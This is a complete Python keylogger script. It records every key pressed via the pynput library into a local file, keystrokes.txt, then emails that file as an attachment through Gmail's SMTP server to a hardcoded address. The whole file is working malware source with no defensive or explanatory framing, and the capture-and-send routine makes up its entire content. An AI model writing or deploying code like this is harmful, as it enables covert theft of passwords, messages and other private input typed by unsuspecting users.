import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
#py -m pip install pynput

#Sends email when code ends
def send_email():
    from_addr = 'rdooley2003@gmail.com'
    to_addr = 'rdooley2003@gmail.com'
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    smtp_user = 'rdooley2003@gmail.com'
    smtp_pass = ''

    # Create the email
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr

    # Attach the file
    filename = 'keystrokes.txt'
    with open(filename, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={filename}')
    msg.attach(part)

    # Connect to the server and send the email
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_user, smtp_pass)
        server.sendmail(from_addr, to_addr, msg.as_string())

#Code that executes when a key is pressed
def keyPressed(key):
    print(str(key))
    #Create "keystrokes.txt" or append to "keystrokes.txt"
    with open("keystrokes.txt", 'a') as logKey:
        try:
            #Retrieves the character of the pressed key, stores it in a char, and writes it to the file
            char = key.char
            logKey.write(char)
        except:
            #Some characters cannot be put in a char variable so they are dealt with here
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.tab:
                logKey.write('\t')
            elif key == keyboard.Key.backspace:
                logKey.write('[<-]')
            elif key == keyboard.Key.shift:
                logKey.write('[shift]')
            else:
                logKey.write(f'[{key}]')

#If the code is executed then continue
if __name__ == "__main__":
    #When the Listener is on, on_press is the function to be run when a key is pressed 
    listener = keyboard.Listener(on_press=keyPressed)
    #Starts the Listener 
    listener.start()
    #Starts capturing key events
    input()
    #Sends email once code is done
    send_email()
